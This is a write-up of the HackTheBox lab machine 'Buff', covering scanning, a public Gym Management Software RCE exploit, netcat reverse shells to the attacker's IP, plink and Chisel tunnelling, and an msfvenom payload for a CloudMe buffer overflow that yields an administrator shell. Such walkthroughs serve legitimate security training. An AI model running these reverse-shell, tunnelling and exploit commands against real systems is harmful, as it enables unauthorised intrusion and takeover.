## Buff | HackTheBox

### 1. Scan
```bash
kali@kali:~/Desktop$ sudo nmap -A -p- -T4 10.10.10.198
[sudo] password for kali: 
Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-20 01:45 EDT
Nmap scan report for 10.10.10.198
Host is up (0.43s latency).
Not shown: 65533 filtered ports
PORT     STATE SERVICE    VERSION
7680/tcp open  pando-pub?
8080/tcp open  http       Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.6)
| http-open-proxy: Potentially OPEN proxy.
|_Methods supported:CONNECTION
|_http-server-header: Apache/2.4.43 (Win64) OpenSSL/1.1.1g PHP/7.4.6
|_http-title: mrb3n's Bro Hut
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows XP|7 (86%)
OS CPE: cpe:/o:microsoft:windows_xp::sp2 cpe:/o:microsoft:windows_7
Aggressive OS guesses: Microsoft Windows XP SP2 (86%), Microsoft Windows 7 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops

TRACEROUTE (using port 8080/tcp)
HOP RTT       ADDRESS
1   333.47 ms 10.10.14.1
2   468.64 ms 10.10.10.198

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 851.64 seconds
```
The machine is running a service guessed by nmap to be "pando-pub" on port 7680 and a http server on port 8080. There were no exact OS matches for the host, just high guesses for Windows XP and Windows 7.

### 2. Enumerate
Running recursebuster against the main site reveals a few existing elements.
```bash
kali@kali:~/Desktop/htb/buff$ recursebuster -u http://10.10.10.198:8080 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 20 -badbod 'not found'
GET http://10.10.10.198:8080/img [301 Moved Permanently] http://10.10.10.198:8080/img/
GET http://10.10.10.198:8080/profile [301 Moved Permanently] http://10.10.10.198:8080/profile/
GET http://10.10.10.198:8080/ [200 OK]
GET http://10.10.10.198:8080/admin [301 Moved Permanently] http://10.10.10.198:8080/admin/
GET http://10.10.10.198:8080/upload [301 Moved Permanently] http://10.10.10.198:8080/upload/
GET http://10.10.10.198:8080/license [200 OK]
GET http://10.10.10.198:8080/include [301 Moved Permanently] http://10.10.10.198:8080/include/
GET http://10.10.10.198:8080/licenses [403 Forbidden]
GET http://10.10.10.198:8080/Profile [301 Moved Permanently] http://10.10.10.198:8080/Profile/
GET http://10.10.10.198:8080/LICENSE [200 OK]
GET http://10.10.10.198:8080/att [301 Moved Permanently] http://10.10.10.198:8080/att/
GET http://10.10.10.198:8080/IMG [301 Moved Permanently] http://10.10.10.198:8080/IMG/
GET http://10.10.10.198:8080/License [200 OK]
GET http://10.10.10.198:8080/ex [301 Moved Permanently] http://10.10.10.198:8080/ex/
GET http://10.10.10.198:8080/Admin [301 Moved Permanently] http://10.10.10.198:8080/Admin/
GET http://10.10.10.198:8080/Img [301 Moved Permanently] http://10.10.10.198:8080/Img/
GET http://10.10.10.198:8080/boot [301 Moved Permanently] http://10.10.10.198:8080/boot/
GET http://10.10.10.198:8080/Upload [301 Moved Permanently] http://10.10.10.198:8080/Upload/
GET http://10.10.10.198:8080/phpmyadmin [403 Forbidden]
GET http://10.10.10.198:8080/Include [301 Moved Permanently] http://10.10.10.198:8080/Include/
GET http://10.10.10.198:8080/Boot [301 Moved Permanently] http://10.10.10.198:8080/Boot/
GET http://10.10.10.198:8080/server-status [403 Forbidden]
GET http://10.10.10.198:8080/Ex [301 Moved Permanently] http://10.10.10.198:8080/Ex/
```
There is a PHP-based upload form at /admin. I spent a while exploring this, however did not find any way to gain a foothold using it. Just doing some clicking through of the website, the about page reads:
```

    mrb3n's Bro Hut
    Made using Gym Management Software 1.0 

```
I orginally thought this was made up, but when searching for it, it turns out to be a real thing. There is also a known RCE exploit. This was a good lesson not to discount something just because it sounds dumb and made up.

### 3. Get a shell
I download the exploit from https://www.exploit-db.com/exploits/48506, and suprisingly it just works (first time, that doesn't happen often with me) and I get a CMD shell.
```bash
kali@kali:~/Desktop/htb/buff$ python gym_rce.py http://10.10.10.198:8080/
            /\
/vvvvvvvvvvvv \--------------------------------------,                                                                                            
`^^^^^^^^^^^^ /============BOKU====================="
            \/

[+] Successfully connected to webshell.
C:\xampp\htdocs\gym\upload> whoami
�PNG
▒
buff\shaun

C:\xampp\htdocs\gym\upload> type C:\Users\shaun\Desktop\user.txt
```
Ideally I'd like to get access to something less restrictive than this web shell, although it is a pretty nice one. A dir command reveals nc.exe is in the uploads directory already. There is also 64 bit netcat and plink.exe.
```bash
C:\xampp\htdocs\gym\upload> dir
�PNG
▒
 Volume in drive C has no label.
 Volume Serial Number is A22D-49F7

 Directory of C:\xampp\htdocs\gym\upload

22/07/2020  07:23    <DIR>          .
22/07/2020  07:23    <DIR>          ..
22/07/2020  07:21                53 kamehameha.php
22/07/2020  07:20            38,616 nc.exe
22/07/2020  07:23            45,272 nc64.exe
22/07/2020  07:20           598,440 plink.exe
               4 File(s)        682,381 bytes
               2 Dir(s)   8,045,072,384 bytes free
```
Firstly start my listener:
```bash
kali@kali:~/Desktop$ nc -lvp 9999
Listening on 0.0.0.0 9999
```
Then execute nc through the webshell to connect back.
```bash
C:\xampp\htdocs\gym\upload> nc -e powershell 10.10.14.166 9999
```
The connection is recieved, and I now have a shell.
```bash
kali@kali:~/Desktop$ nc -lvp 9999
Listening on 0.0.0.0 9999
Connection received on 10.10.10.198 49848
Windows PowerShell 
Copyright (C) Microsoft Corporation. All rights reserved.

whoami
PS C:\xampp\htdocs\gym\upload> whoami
buff\shaun
PS C:\xampp\htdocs\gym\upload>
```

### 4. Enumeration from user
I start enumerating through the different directories. There are a lot of files present that are accessible to the user, but one in particular that stands out is CloudMe_1112.exe in the Downloads folder.
```
PS C:\Users\shaun\Downloads> ls

    Directory: C:\Users\shaun\Downloads


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----       16/06/2020     16:26       17830824 CloudMe_1112.exe

PS C:\Users\shaun\Downloads>
```
This version of CloudMe 1.11.2 sync has several proof of concept exploits related to a buffer overflow. By running this exe, I know CloudMe should be running on port 8888, which I can verify with a powershell command.
```bash
PS C:\xampp\htdocs\gym\upload> Get-Process -Id (Get-NetTCPConnection -LocalPort 8888).OwningProcess                   
Get-Process -Id (Get-NetTCPConnection -LocalPort 8888).OwningProcess

Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
-------  ------    -----      -----     ------     --  -- -----------                                                  
    288      50    30332        144              4000   0 CloudMe
```
The exploit proof of concept is at https://www.exploit-db.com/exploits/48389, and is written in Python, which is not present on the machine. With the knowledge that this is most highly likely a valid path to root I can end enumeration and move forward to exploit this process.

### 5. Escalate privileges
I can try to use plink to create a connection to my machine which should expose that port to me for exploitation using python.  
Reference: https://null-byte.wonderhowto.com/how-to/use-remote-port-forwarding-slip-past-firewall-restrictions-unnoticed-0179716/  
  
This was a bit of a nightmare to do - a lot of the time the connection would just die and not connect properly, which I suspect was something to do with the SSH configuration of my attacker machine. Eventually I got it working, from what I can tell I just run `systemctl start ssh` and then tried to connect and it just decided to work. Still not entirely sure what I did wrong the previous 100 times. Note my IP address is different from this point forward because it took me several days to actually get it working.
```bash
PS C:\xampp\htdocs\gym\upload> ./plink.exe 10.10.15.145 -R 8888:127.0.0.1:8888 -l kali -pw <pw>
The server's host key is not cached in the registry. You
have no guarantee that the server is the computer you
think it is.
The server's ssh-ed25519 key fingerprint is:
ssh-ed25519 255 cd:7e:6f:22:5d:6a:aa:3e:17:d9:07:b5:0b:6c:8d:bd
If you trust this host, enter "y" to add the key to
PuTTY's cache and carry on connecting.
If you want to carry on connecting just once, without
adding the key to the cache, enter "n".
If you do not trust this host, press Return to abandon the
connection.
Store key in cache? (y/n) y
Using username "kali".
Linux kali 5.6.0-kali1-amd64 #1 SMP Debian 5.6.7-1kali1 (2020-05-12) x86_64

The programs included with the Kali GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Kali GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sun Aug  2 21:30:35 2020 from 10.10.10.198
kali@kali:~$
```
In this instance, plink is binding to a port on the attacking machine using SSH, and connecting that port to the local service running on port 8888, which is Cloudme 1.11.2. This creates a tunnel to the previously-unreachable service through which I can now use to interact with it on my machine.
Next step is to modify the exploit with a new payload. I tried a number of different payloads, eventually the one that worked was making use of the existing nc.exe in the downloads folder to send a reverse shell back to me.
  
Generating payload:
```bash
kali@kali:~/Desktop/htb/buff$ msfvenom -a x86 --platform windows -p windows/exec CMD='C:\xampp\htdocs\gym\upload\nc.exe -e powershell 10.10.15.145 4444' -b '\x00\x0A\x0D' -f python > payload
Found 11 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 277 (iteration=0)
x86/shikata_ga_nai chosen with final size 277
Payload size: 277 bytes
Final size of python file: 1361 bytes
```
In order to ensure the CloudMe process is running, I need to spawn another powershell instance using the webshell and then use this instance to run the service. The good thing is I was able to run it over and over to test different payloads until one finally worked (it ended up taking quite a few to find one which worked).
```bash
kali@kali:~/Desktop/htb/buff$ python gym_rce.py http://10.10.10.198:8080/
            /\
/vvvvvvvvvvvv \--------------------------------------,                                                                                                                                                      
`^^^^^^^^^^^^ /============BOKU====================="
            \/

[+] Successfully connected to webshell.
C:\xampp\htdocs\gym\upload> nc -e powershell 10.10.15.145 5555
```
On the new connection:
```bash
kali@kali:~/Desktop$ nc -lvp 5555
Listening on 0.0.0.0 5555
Connection received on 10.10.10.198 50388
Windows PowerShell 
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\xampp\htdocs\gym\upload> cd C:\Users\shaun\Downloads
cd C:\Users\shaun\Downloads
ls
PS C:\Users\shaun\Downloads> ls


    Directory: C:\Users\shaun\Downloads


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
-a----       16/06/2020     16:26       17830824 CloudMe_1112.exe                                                      


PS C:\Users\shaun\Downloads> ./CloudMe_1112.exe
./CloudMe_1112.exe
```
I can just run the app over and over from here, no worries.
With the tunnel to the service establised, I add the payload into the script and run it...
```bash
kali@kali:~/Desktop/htb/buff$ python cloudme_exploit.py 
Payload sent to 127.0.0.1:8888
```
Catch the shell on the other netcat listener I have open.
```bash
kali@kali:~/Desktop/htb/buff$ nc -lvnp 4444                                                                                                                                                                 
Listening on 0.0.0.0 4444                                                                                                                                                                                   
Connection received on 10.10.10.198 50606                                                                                                                                                                   
Windows PowerShell 
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Windows\system32> whoami
whoami
buff\administrator
```

### Extra notes
I also experimented with using Chisel for creating a tunnel on this VM.  
Creating a Chisel server on attacker machine:
```bash
kali@kali:~/Desktop$ chisel server -p 7777 --reverse
2020/08/03 06:14:09 server: Reverse tunnelling enabled
2020/08/03 06:14:09 server: Fingerprint 9e:99:ff:95:df:77:7e:b8:65:4c:c4:3a:84:0e:9e:05
2020/08/03 06:14:09 server: Listening on 0.0.0.0:7777...
```
The server is used as a central point to route and create connections. To start a reverse tunnel, on the target machine, run the Chisel binary like so:
```bash
PS C:\xampp\htdocs\gym\upload> ./chisel.exe client 10.10.15.145:7777 R:8888:127.0.0.1:8888
./chisel.exe client 10.10.15.145:7777 R:8888:127.0.0.1:8888
2020/08/03 11:14:46 client: Connecting to ws://10.10.15.145:7777
2020/08/03 11:14:48 client: Fingerprint 0c:a0:69:41:25:ae:4d:e9:dd:c2:50:c6:5b:34:53:cb
2020/08/03 11:14:50 client: Connected (Latency 487.0431ms)
```
The first arg is the address of the server, then which ports to translate.